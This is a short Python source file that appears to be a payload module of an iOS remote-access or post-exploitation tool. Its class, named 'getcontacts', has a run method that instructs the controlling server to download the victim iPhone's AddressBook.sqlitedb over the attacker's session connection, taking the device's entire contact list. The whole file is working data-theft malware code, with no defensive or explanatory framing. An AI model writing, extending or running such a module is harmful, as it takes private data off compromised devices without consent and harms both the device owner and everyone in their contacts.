class payload:
    def __init__(self):
        self.name = "getcontacts"
        self.description = "download addressbook"
        self.type = "download"
        self.id = 121

    def run(self,session,server,command):
        server.sendCommand("download","/var/mobile/Library/AddressBook/AddressBook.sqlitedb","download",session.conn)
        return ""
